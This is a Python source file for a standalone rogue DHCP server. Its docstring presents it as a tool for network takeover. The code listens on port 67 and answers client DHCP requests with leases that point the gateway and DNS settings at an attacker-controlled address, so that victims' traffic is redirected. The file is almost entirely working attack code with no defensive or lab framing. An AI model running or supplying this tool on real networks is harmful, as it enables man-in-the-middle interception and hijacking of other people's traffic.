"""
Rogue DHCP Server
=================
Standalone rogue DHCP server for network takeover.

Provides attacker-controlled IP assignments with malicious
DNS and gateway settings to redirect traffic.
"""

import socket
import struct
import threading
import time
from typing import Dict, Optional, Tuple


class RogueDHCP:
    """Rogue DHCP server for network takeover."""

    DHCP_DISCOVER = 1
    DHCP_OFFER = 2
    DHCP_REQUEST = 3
    DHCP_ACK = 5

    def __init__(self, iface: str, gateway: str = "192.168.100.1",
                 dns: str = "192.168.100.1"):
        self.iface = iface
        self.gateway = gateway
        self.dns = dns
        self.pool_start = "192.168.100.10"
        self.pool_end = "192.168.100.250"
        self.leases: Dict[str, Tuple[str, float]] = {}
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.stats = {"offers": 0, "acks": 0}

    def _build_dhcp_packet(self, msg_type: int, xid: bytes,
                          client_mac: bytes, yiaddr: str) -> bytes:
        """Build DHCP response packet."""
        yiaddr_bytes = socket.inet_aton(yiaddr)
        pkt = bytearray(240)
        pkt[0] = 2 if msg_type in (self.DHCP_OFFER, self.DHCP_ACK) else 1
        pkt[1] = 1
        pkt[2] = 6
        pkt[4:8] = xid
        pkt[16:20] = yiaddr_bytes
        pkt[28:34] = client_mac
        pkt[236:240] = bytes([0x63, 0x82, 0x53, 0x63])

        opts = bytes([53, 1, msg_type])
        opts += bytes([54, 4]) + socket.inet_aton(self.gateway)
        opts += bytes([51, 4]) + struct.pack(">I", 3600)
        opts += bytes([1, 4]) + socket.inet_aton("255.255.255.0")
        opts += bytes([3, 4]) + socket.inet_aton(self.gateway)
        opts += bytes([6, 4]) + socket.inet_aton(self.dns)
        opts += bytes([255])

        return bytes(pkt) + opts

    def _next_ip(self) -> Optional[str]:
        """Get next available IP from pool."""
        used = {ip for ip, _ in self.leases.values()}
        parts = self.pool_start.split(".")
        for i in range(10, 251):
            ip = f"{parts[0]}.{parts[1]}.{parts[2]}.{i}"
            if ip not in used:
                return ip
        return None

    def start(self) -> bool:
        """Start rogue DHCP server."""
        self._running = True
        self._thread = threading.Thread(target=self._dhcp_loop, daemon=True)
        self._thread.start()
        return True

    def _dhcp_loop(self) -> None:
        """Main DHCP packet loop."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.bind(("0.0.0.0", 67))
            sock.settimeout(2.0)

            while self._running:
                try:
                    data, addr = sock.recvfrom(1024)
                    if len(data) < 240:
                        continue
                    msg_type = data[242] if len(data) > 242 else 0
                    xid = data[4:8]
                    client_mac = data[28:34]
                    mac_str = ":".join(f"{b:02x}" for b in client_mac)

                    if msg_type == self.DHCP_DISCOVER:
                        ip = self._next_ip()
                        if ip:
                            offer = self._build_dhcp_packet(
                                self.DHCP_OFFER, xid, client_mac, ip
                            )
                            sock.sendto(offer, ("255.255.255.255", 68))
                            self.stats["offers"] += 1

                    elif msg_type == self.DHCP_REQUEST:
                        ip = self._next_ip()
                        if ip:
                            ack = self._build_dhcp_packet(
                                self.DHCP_ACK, xid, client_mac, ip
                            )
                            sock.sendto(ack, ("255.255.255.255", 68))
                            self.leases[mac_str] = (ip, time.time())
                            self.stats["acks"] += 1
                except socket.timeout:
                    continue
        except PermissionError:
            print("[RogueDHCP] Requires root for port 67")
        except Exception as e:
            print(f"[RogueDHCP] Error: {e}")

    def stop(self) -> None:
        """Stop DHCP server."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=3)

    def get_stats(self) -> Dict[str, int]:
        """Return DHCP statistics."""
        return {**self.stats, "active_leases": len(self.leases)}
